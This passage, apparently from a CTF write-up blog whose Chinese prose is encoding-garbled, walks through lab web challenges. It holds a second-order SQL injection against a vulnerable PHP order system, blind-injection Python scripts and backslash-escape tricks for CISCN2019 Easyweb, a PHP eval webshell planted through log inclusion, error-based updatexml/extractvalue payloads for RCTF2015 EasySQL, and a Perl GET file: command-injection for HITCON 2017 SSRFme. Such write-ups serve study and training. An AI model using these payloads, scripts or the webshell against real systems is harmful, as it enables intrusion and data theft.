class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;ä¿¡æ¯ä¸å…¨&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>delete.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;config.php&quot;</span>;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;phone&quot;</span>]))<br>&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;<br>    <span class="hljs-variable">$user_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user_name&quot;</span>];<br>    <span class="hljs-variable">$phone</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;phone&quot;</span>];<br>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$user_name</span>) || preg_match(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$phone</span>))&#123; <br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;no sql inject!&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from `user` where `user_name`=&#x27;<span class="hljs-subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="hljs-subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;<br>        <span class="hljs-variable">$fetch</span> = <span class="hljs-variable">$db</span>-&gt;query(<span class="hljs-variable">$sql</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$fetch</span>) &amp;&amp; <span class="hljs-variable">$fetch</span>-&gt;num_rows&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-variable">$row</span> = <span class="hljs-variable">$fetch</span>-&gt;fetch_assoc();<br>        <span class="hljs-variable">$result</span> = <span class="hljs-variable">$db</span>-&gt;query(<span class="hljs-string">&#x27;delete from `user` where `user_id`=&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;user_id&quot;</span>]);<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;error&#x27;</span>;<br>            print_r(<span class="hljs-variable">$db</span>-&gt;error);<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;Ã¨Â®Â¢Ã¥ÂÂ•Ã¥Âˆ Ã©Â™Â¤Ã¦ÂˆÂÃ¥ÂŠÂŸ&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;Ã¦ÂœÂªÃ¦Â‰Â¾Ã¥ÂˆÂ°Ã¨Â®Â¢Ã¥ÂÂ•!&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;Ã¤Â¿Â¡Ã¦ÂÂ¯Ã¤Â¸ÂÃ¥Â…Â¨&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>change.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;config.php&quot;</span>;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;address&quot;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;phone&quot;</span>]))<br>&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;<br>    <span class="hljs-variable">$user_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user_name&quot;</span>];<br>    <span class="hljs-variable">$address</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;address&quot;</span>]);<br>    <span class="hljs-variable">$phone</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;phone&quot;</span>];<br>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$user_name</span>) || preg_match(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$phone</span>))&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;no sql inject!&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from `user` where `user_name`=&#x27;<span class="hljs-subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="hljs-subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;<br>        <span class="hljs-variable">$fetch</span> = <span class="hljs-variable">$db</span>-&gt;query(<span class="hljs-variable">$sql</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$fetch</span>) &amp;&amp; <span class="hljs-variable">$fetch</span>-&gt;num_rows&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-variable">$row</span> = <span class="hljs-variable">$fetch</span>-&gt;fetch_assoc();<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="hljs-variable">$address</span>.<span class="hljs-string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;address&#x27;</span>].<span class="hljs-string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>];<br>        <span class="hljs-variable">$result</span> = <span class="hljs-variable">$db</span>-&gt;query(<span class="hljs-variable">$sql</span>);<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;error&#x27;</span>;<br>            print_r(<span class="hljs-variable">$db</span>-&gt;error);<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;è®¢å•ä¿®æ”¹æˆåŠŸ&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;æœªæ‰¾åˆ°è®¢å•!&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;ä¿¡æ¯ä¸å…¨&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><div class="code-wrapper"><pre><code class="hljs">å¯ä»¥çœ‹åˆ°change.php è¿™é‡Œ å¯¹username,phoneåšäº†sqlæ­£åˆ™æ£€æŸ¥ï¼Œaddressè¿™å—åªä½œäº†addslasheså¤„ç†ã€‚å¼•å·` &#39;` åœ¨addslashes()ä½œç”¨ä¸‹,å˜æˆ` \&#39;` , ä½†æ˜¯åœ¨æ’å…¥æ•°æ®åº“çš„æ—¶å€™åˆä¼šå˜æˆ `&#39;`ï¼Œå› æ­¤addressè¿™é‡Œä¼šå¼•å‘äºŒæ¬¡æ³¨å…¥ã€‚</code></pre></div><p>å› æ­¤æœ‰</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201222038391.png" alt="image-20220122203811136"></p><p><code>1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,30)),0x7e),1)#</code> å—é•¿åº¦é™åˆ¶è¿™é‡Œåˆ†ä¸¤å—æ¥è¯»å–</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201222038410.png" alt="image-20220122203848149"></p><p>æ¥åˆ°ä¿®æ”¹æ”¶è´§åœ°å€è¿™é‡ŒåšåŒæ ·æ“ä½œ</p><p>flag{efbe90c4-e122-478a-8f4f-6</p><p>å¦ä¸€åŠæ“ä½œåŒç† <code>1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),31,60)),0x7e),1)#</code> ä¸è´´å›¾äº†</p><h2 id="CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb"><a href="#CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb"></a>[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb</h2><p>è¿™ç§æ²¡å•¥æ€è·¯ è¿˜æ˜¯phpçš„ åŸºæœ¬éƒ½å­˜åœ¨æºç æ³„éœ²ï¼Œæˆ‘ç…§ç€è¿™ä¸ªæ€è·¯ï¼Œæ‰¾åˆ°äº†æ³„éœ²çš„æºç    <code>image.php.bak</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;ï»¿?php<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;config.php&quot;</span>;<br><br><span class="hljs-variable">$id</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>]:<span class="hljs-string">&quot;1&quot;</span>;<br><span class="hljs-variable">$path</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>]:<span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-variable">$id</span>=addslashes(<span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$path</span>=addslashes(<span class="hljs-variable">$path</span>);<br><br><span class="hljs-variable">$id</span>=str_replace(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\\0&quot;</span>,<span class="hljs-string">&quot;%00&quot;</span>,<span class="hljs-string">&quot;\\&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>),<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$path</span>=str_replace(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\\0&quot;</span>,<span class="hljs-string">&quot;%00&quot;</span>,<span class="hljs-string">&quot;\\&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>),<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$path</span>);<br><br><span class="hljs-variable">$result</span>=mysqli_query(<span class="hljs-variable">$con</span>,<span class="hljs-string">&quot;select * from images where id=&#x27;<span class="hljs-subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="hljs-subst">&#123;$path&#125;</span>&#x27;&quot;</span>);<br><span class="hljs-variable">$row</span>=mysqli_fetch_array(<span class="hljs-variable">$result</span>,MYSQLI_ASSOC);<br><br><span class="hljs-variable">$path</span>=<span class="hljs-string">&quot;./&quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;path&quot;</span>];<br>header(<span class="hljs-string">&quot;Content-Type: image/jpeg&quot;</span>);<br>readfile(<span class="hljs-variable">$path</span>);<br></code></pre></td></tr></table></figure><p>å•æ‹å‡ºæ¥sqlè¯­å¥ <code>select * from images where id=&#39;&#123;$id&#125;&#39; or path=&#39;&#123;$path&#125;&#39;</code></p><p>å¦‚æœidä¼ å…¥ <code>id=\\0</code>   ç»è¿‡addslasheså¤„ç†è¿‡åï¼Œå˜æˆ <code>id=\\0</code>  åœ¨ç»è¿‡str_replaceçš„å¤„ç†å˜æˆ <code>id=\</code> </p><p>å¸¦å…¥sqlè¯­å¥å˜æˆ <code>\&#39; or path=&#39;&#123;$path&#125;&#39;</code>  ï¼Œä¹Ÿå°±ç­‰äºæ˜¯å¸®æˆ‘ä»¬æ’å…¥äº†ä¸€ä¸ªå•å¼•å·ï¼Œå¯ä»¥è¿›è¡Œæ³¨å…¥</p><p><code>http://ec9c3894-d0c2-4b5c-ac73-6f230b4e86eb.node4.buuoj.cn:81/image.php?id=\\0&amp;path=or 1=if(length(database())&gt;1,1,1)%23</code></p><p>æˆ‘è‡ªå·±çš„äºŒåˆ†è„šæœ¬æ²¡æå‡ºæ¥ä¸çŸ¥é“ä¸ºå•¥ï¼Œå€Ÿé‰´ä¸€ä¸‹è¿™ä½è€å“¥çš„ <a href="https://blog.csdn.net/weixin_44037296/article/details/110918624">https://blog.csdn.net/weixin_44037296/article/details/110918624</a></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201231907876.png" alt="image-20220123190718690"></p><p>ç„¶åè·å–åˆ—å å› ä¸ºè¿™é‡Œè¿‡æ»¤äº† <code>â€˜</code> å’Œ  <code> &quot;</code> æ‰€ä»¥è¿™é‡Œéœ€è¦å§users è½¬ä¸º16è¿›åˆ¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;http://ec9c3894-d0c2-4b5c-ac73-6f230b4e86eb.node4.buuoj.cn:81/image.php?id=\\0&amp;path=or 1=&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>column_name = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">127</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>        payload = <span class="hljs-string">&#x27;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273 ),%d,1))=%d,1,-1)%%23&#x27;</span> % (i, c)<br>        r = requests.get(url+payload)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;JFIF&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            column_name += <span class="hljs-built_in">chr</span>(c)<br>            <span class="hljs-built_in">print</span>(table_name)<br>            <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><p>å“ï¼Ÿæˆ‘å‘ç°åŸå…ˆä½œè€…è¿™ä¸ªè„šæœ¬ä»127å¼€å§‹æ€è·¯è›®ä¸é”™çš„ä¹‹å‰æ²¡æƒ³åˆ°ï¼Œè¿™æ ·åœ¨å­—æ¯è¾ƒå¤šæƒ…å†µå¯ä»¥æå¤§æé«˜æ•ˆç‡ã€‚</p><p>userè¡¨æœ‰usernameå’Œpasswordå­—æ®µã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><br>url = <span class="hljs-string">&#x27;http://ec9c3894-d0c2-4b5c-ac73-6f230b4e86eb.node4.buuoj.cn:81/image.php?id=\\0&amp;path=or 1=&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>username = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">127</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>        payload = <span class="hljs-string">&#x27;if(ascii(substr((select group_concat(username) from users),%d,1))=%d,1,-1)%%23&#x27;</span> % (i, c)<br>        r = requests.get(url+payload)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;JFIF&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            username += <span class="hljs-built_in">chr</span>(c)<br>            <span class="hljs-built_in">print</span>(username)<br>            <span class="hljs-keyword">break</span><br>         <br></code></pre></td></tr></table></figure><p>è·‘å‡ºç”¨æˆ·å admin å¯†ç  e6a6f6320923a5832077 æˆ‘å¾—ç ”ç©¶ä¸€ä¸‹æˆ‘çš„äºŒåˆ†è„šæœ¬äº†å“â€¦</p><p>ç„¶åæ–‡ä»¶ä¼ phpè¢«è¿‡æ»¤è¿™é‡Œæ˜¯ä¸€ä¸ªæ—¥å¿—åŒ…å«</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201232007779.png" alt="image-20220123200742680"></p><p>å› æ­¤æˆ‘ä»¬å§filenameè®¾ç½®ä¸ºä¸€å¥è¯æœ¨é©¬ <code>&lt;?=@eval($_POST[&#39;a&#39;]);?&gt;</code> è¿™æ ·æœåŠ¡é‡Œç•™æœ‰ä¸€ä¸ªè®¿é—®è¿™ä¸ªé©¬å­çš„è®°å½• æˆ‘ä»¬è®¿é—®è¿æ¥getshell</p><h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><p>è¿›å…¥ç¯å¢ƒåªæœ‰ æ³¨å†Œï¼Œç™»å½•ä¸¤ä¸ªé€‰é¡¹ï¼Œå…¶å®è¿™ä¸ªæ—¶å€™å°±å¯ä»¥è€ƒè™‘æ˜¯ä¸æ˜¯è€ƒå¯Ÿçš„äºŒæ¬¡æ³¨å…¥ </p><p>ç„¶åæ³¨å†Œä¸€ä¸ª adminâ€ çš„è´¦æˆ· ï¼Œè¿™æ ·åœ¨ä¿®æ”¹å¯†ç çš„æ—¶å€™å°±æŠ¥é”™</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201232027005.png" alt="image-20220123202722922"></p><p>è¿™é¢˜ä¹ŸæŒºç‰›é€¼çš„ï¼Œæˆ‘è¿™é‡Œæ²¡å†™å¯†ç å’Œé‚®ç®±éƒ½â€¦</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201241700503.png" alt="image-20220124170050325"></p><p>fuzzäº†ä¸‹ï¼Œè¿™é‡Œå¯ä»¥æ˜¯ç”¨æŠ¥é”™æ³¨å…¥ï¼Œä¸è¿‡</p><p>å…ˆæ„é€  <code>a&quot;and(updatexml(1,concat(0x3a,(select(user()),0x3a),1)#</code>   è¿‡æ»¤äº†and =&gt; <code>a&quot;||(updatexml(1,concat(0x3a,(select(user()),0x3a),1)#</code></p><p>å¾—åˆ° root@localhost</p><p>æ‹¿è¡¨å</p><p><code>2&quot;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1)#</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201241717658.png" alt="image-20220124171722593"></p><p>ä¹‹å æ‹¿åˆ—å <code>2&quot;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;))),1)#</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201241719208.png" alt="image-20220124171906153"></p><p>ä½†æ˜¯flagä¸åœ¨è¿™é‡Œï¼Œå›åˆ°userè¡¨  </p><p><code>2&quot;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;))),1)#</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201241722189.png" alt="image-20220124172233130"></p><p> åœ¨æ„å»ºpayloadçš„æ—¶å€™ä¸éš¾å‘ç° è¿™ä¸ªis_heræœªå…å¥‡æ€ªäº†ç‚¹ï¼Œè”æƒ³åˆ°æŠ¥é”™çš„é•¿åº¦é™åˆ¶ è¿™é‡Œå¯ä»¥ç”¨æ­£åˆ™è¡¨è¾¾å¼åªæå–è¿™ä¸ªå­—æ®µ</p><p><code>2&quot;||(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;&amp;&amp;(column_name)regexp(&#39;^r&#39;))),0x7e)));#           </code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201241731857.png" alt="image-20220124173101800"></p><p><code>2&quot;||(extractvalue(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where((real_flag_1s_here)regexp(&#39;^f&#39;))),0x7e)));#        </code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201241732482.png" alt="image-20220124173232425"></p><p>flagå½¢å¼8-4-4-12 è¿™ä¸ªå¾ˆæ˜æ˜¾ä¸ç¬¦åˆ è¿™é‡Œå¯ä»¥ç¿»è½¬æˆ–è€…æˆªæ–­ï¼Œæˆ‘è¿™é‡Œç”¨ç¿»è½¬äº†</p><p><code>2&quot;||(extractvalue(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where((real_flag_1s_here)regexp(&#39;^f&#39;)))),0x7e)));#                    </code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201241736165.png" alt="image-20220124173656105"></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201241737253.png" alt="image-20220124173743176"></p><p>å†™åˆ°è¿™é‡Œæˆ‘æ„è¯†åˆ°ä¸€ä¸ªå‚»é€¼äº‹å„¿æˆ‘æ²¡ä¿å­˜å‰åŠéƒ¨åˆ†flagï¼ŒOCRäº†â€¦</p><h2 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<br>       <span class="hljs-variable">$http_x_headers</span> = explode(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);<br>       <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="hljs-variable">$http_x_headers</span>[<span class="hljs-number">0</span>];<br>   &#125;<br><br>   <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];<br><br>   <span class="hljs-variable">$sandbox</span> = <span class="hljs-string">&quot;sandbox/&quot;</span> . md5(<span class="hljs-string">&quot;orange&quot;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]);<br>   @mkdir(<span class="hljs-variable">$sandbox</span>);<br>   @chdir(<span class="hljs-variable">$sandbox</span>);<br><br>   <span class="hljs-variable">$data</span> = shell_exec(<span class="hljs-string">&quot;GET &quot;</span> . escapeshellarg(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;url&quot;</span>]));<br>   <span class="hljs-variable">$info</span> = pathinfo(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;filename&quot;</span>]);<br>   <span class="hljs-variable">$dir</span>  = str_replace(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, basename(<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;dirname&quot;</span>]));<br>   @mkdir(<span class="hljs-variable">$dir</span>);<br>   @chdir(<span class="hljs-variable">$dir</span>);<br>   @file_put_contents(basename(<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;basename&quot;</span>]), <span class="hljs-variable">$data</span>);<br>   highlight_file(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>åˆçœ‹å†™é©¬ï¼Œä½†æ˜¯æˆ‘ä»¬çš„é—®é¢˜åœ¨å“ªå„¿ï¼Ÿ18è¡Œè¿™é‡Œå–basename æˆ‘ä»¬çš„æ–‡ä»¶å¯èƒ½ä¸ä¼šè¢«å½“åšphpæ–‡ä»¶è§£æï¼Œä¹Ÿå°±æ— æ³•getshell</p><p>ç½‘ä¸Šäº†è§£äº†ä¸€ä¸‹ï¼Œline 13çš„è¿™ä¸ªGETæ˜¯   Lib for WWW in Perlä¸­çš„å‘½ä»¤ ç›®çš„æ˜¯æ¨¡æ‹Ÿhttpçš„GETè¯·æ±‚</p><div class="code-wrapper"><pre><code class="hljs">perlå­˜åœ¨GETçš„rceæ¼æ´ï¼Œå³perlçš„GETå‡½æ•°åº•å±‚ä¼šä½¿ç”¨openå‡½æ•°ï¼Œè€Œopenå‡½æ•°æ”¯æŒfileåè®®ï¼Œè¿™ä½¿å¾—æˆ‘ä»¬å¯ä»¥æ¥è¯»å–æ–‡ä»¶æœ‰ä¸¤ä¸ªå‰æï¼šæ–‡ä»¶å¿…é¡»å­˜åœ¨ï¼Œä¼ å…¥çš„å†…å®¹å¿…é¡»å«æœ‰ | </code></pre></div><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/?<span class="hljs-attribute">url</span>=file:bash -c /readflag|&amp;<span class="hljs-attribute">filename</span>=bash -c /readflag|   è¿™ä¸€æ­¥æ˜¯åˆ›å»ºåŒåæ–‡ä»¶<br>/?<span class="hljs-attribute">url</span>=file:bash -c /readflag|&amp;<span class="hljs-attribute">filename</span>=123    æŠŠæ 